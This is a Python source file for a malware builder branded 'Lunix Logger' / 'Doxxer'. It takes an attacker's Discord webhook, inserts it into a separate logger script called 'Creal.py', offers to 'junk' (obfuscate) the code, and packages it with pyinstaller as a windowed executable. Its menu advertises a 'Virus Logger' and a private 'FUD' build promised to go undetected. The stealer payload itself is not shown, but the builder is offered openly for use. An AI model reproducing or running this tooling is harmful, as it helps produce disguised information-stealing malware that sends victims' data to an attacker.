from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

⠀⠀⠀⠀⡼⠁⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡌⢳⡀⠀⠀⠀
⠀⠀⠀⣸⠃⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⣧⠀⠀⠀
⠀⠀⢠⡏⠀⢸⣇⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢸⡇⠀⢸⡆⠀⠀
⠀⠀⢸⡇⠀⠘⢿⠀⠀⣠⠴⠚⠉⠉⠁⠀⠉⠉⠛⠶⣄⡀⠀⣼⠃⠀⠀⡇⠀⠀
⡆⠀⢸⡇⠀⠀⠈⠳⣾⣭⡙⠀⠀⠀⠀⠀⠀⠀⠀⠏⣭⣿⡾⠃⠀⠀⠀⡇⠀⢠
⡿⡄⠘⣇⠀⠀⢀⠀⠀⢹⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣏⠁⠀⡀⠀⠀⢸⠇⢀⢾
⢸⡙⢄⠹⣆⢄⠀⠁⢲⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣖⠊⠀⢠⣤⠏⢠⢊⡾
⠸⡝⣌⠳⣬⡟⠻⠛⠫⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠜⠛⠟⠺⣏⠔⢁⠊⡇
⠀⣧⠉⡦⣼⡀⠀⡱⠀⠀⠀⠀⠀⠀⡄⢀⠊⠀⠀⠀⠀⠀⠪⠀⢀⣿⠴⠁⢸⠁
⠀⠸⣤⡀⠀⣿⢌⡀⠀⠀⠀⠀⠀⠀⠃⠀⡀⠀⠀⠀⠀⠀⢀⡡⣾⠁⠘⣠⠏⠀    By xylexvxpe 😈⠀
⠀⠀⠈⠻⣄⡏⠀⠈⢻⡖⠦⣄⡀⢠⠀⠀⡇⠀⣀⠤⢒⡿⠁⠀⢹⣄⡼⠁⠀⠀
⠀⠀⠀⠀⠸⡇⠀⠀⠀⠈⠓⠚⠋⠚⠀⠀⠓⠛⠓⠒⠁⠀⠀⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⣦⠀⢤⣔⠒⠀⠀⢹⠀⠀⣌⠀⠀⠒⢒⢤⠄⣰⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣧⠈⠊⣧⡀⠀⡎⠁⠀⢸⡀⠀⣴⠣⠁⣰⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠘⡜⠢⢼⣆⢠⡯⠔⢊⠏⠀⢀⣸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⡀⢫⠺⢤⢿⣮⡦⠒⡹⢀⡴⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⢊⡳⢤⣈⣁⣤⡖⡱⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠉⠉⠉⠉⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⣀⣀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ___                     __         
|   |     __ __   ____  |__|___  ___
|   |    |  |  \ /    \ |  |\  \/  /
|   |___ |  |  /|   |  \|  | \    / 
|______ \|____/ |___|  /|__|/__/\_ 
       \/            \/           
                > Press Enter To Begin                                         
"""

Anime.Fade(Center.Center(intro), Colors.green_to_blue, Colorate.Vertical, interval=0.035, enter=True)


Logo = """
 ___                     __         
|   |     __ __   ____  |__|___  ___
|   |    |  |  \ /    \ |  |\  \/  /
|   |___ |  |  /|   |  \|  | \    / 
|______ \|____/ |___|  /|__|/__/\_ \\
       \/            \/           \/
            Welcome to Doxxer
            Load Successfully !
            Press Enter To Choose your Option __>
"""

Anime.Fade(Center.Center(Logo), Colors.blue_to_purple, Colorate.Vertical, interval=0.035, enter=True)

time.sleep(1)

while True:
    
    Write.Print("\nPlease Choose a option on Lunix Tools ", Colors.blue_to_purple)
    Write.Print("\n[1] Build exe Virus Logger", Colors.blue_to_purple)
    Write.Print("\n[2] Build FUD exe Logger (Virus programs undetected !)", Colors.blue_to_purple)
    Write.Print("\n[3] Close", Colors.blue_to_purple)
    Write.Print("\n[4] Discord Support Server", Colors.red_to_purple)
    Write.Print("\nPlease Make your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nWebhook Link: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.blue_to_purple)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.blue_to_purple)
                break
            elif answer.upper() == "N":
                break
            elif answer.upper() == "Private":
                Write.Print(f"\nWow ! , you got the easter egg from 2023.... , Proof this in to xylexvxpe to get whitelisted !",Colors.blue_to_purple)
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nThanks you For Supporting Lunix Logger , But its Private Feature !", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red_to_yellow)
        break
    elif choice == "4":
        Write.Print("\nSupport Link : https://discord.gg/UZZ6xjVM2p", Colors.red_to_purple)

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)